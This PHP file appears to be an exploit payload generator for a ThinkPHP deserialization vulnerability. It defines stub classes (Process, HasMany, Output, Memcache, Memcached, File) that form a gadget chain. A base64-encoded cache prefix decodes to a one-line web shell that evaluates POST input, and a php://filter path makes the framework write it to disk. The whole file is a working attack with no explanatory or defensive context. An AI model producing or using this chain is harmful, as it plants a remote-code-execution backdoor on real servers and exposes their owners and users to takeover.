<?php
namespace think;


use think\model\relation\HasMany;

class Process
{
    private $processPipes;

    private $status;

    private $processInformation;
    public function  __construct(){
        $this->processInformation['running']=true;
        $this->status=3;
        $this->processPipes=new HasMany();
    }

}
 namespace think;
 class Model{

 }
 namespace think\model;


 use think\Model;
 class Merge extends Model{
     public $a='1';
     public function __construct()
     {
     }
 }



namespace think\model\relation;
use think\console\Output;
use think\db\Query;
use think\model\Merge;
use think\model\Relation;
class HasMany extends Relation
{
    //protected $baseQuery=true;
    protected $parent;
    protected $localKey='a';
    protected $foreignKey='a';
    protected $pivot;
    public function __construct(){
        $this->query=new Output();
        $this->parent= new Merge();

    }
}


namespace think\model;
class Relation
{}
namespace think\db;
class Query{}


namespace think\console;
class Output{
    protected $styles = [
        'info',
        'error',
        'comment',
        'question',
        'highlight',
        'warning',
        'getTable',
        'where'
    ];
    private $handle;
    public function __construct()
    {
        $this->handle = (new \think\session\driver\Memcache);
    }
}
namespace think\session\driver;
class Memcache
{
    protected $handler;
    public function __construct()
    {
        $this->handler = (new \think\cache\driver\Memcached);
    }
}


namespace think\cache\driver;

class Memcached
{
    protected $tag;
    protected $options;
    protected $handler;

    public function __construct()
    {
        $this->tag = true;
        $this->options = [
            'expire'   => 0,
            'prefix'   => 'PD9waHAgZXZhbCgkX1BPU1RbJ3pjeTIwMTgnXSk7ID8+',
        ];
        $this->handler = (new File);
    }
}

class File
{
    protected $tag;
    protected $options;
    public function __construct()
    {
        $this->tag = false;
        $this->options = [
            'expire'        => 3600,
            'cache_subdir'  => false,
            'prefix'        => '',
            'data_compress' => false,
            'path'          => 'php://filter/convert.base64-decode/resource=./',
        ];
    }
}
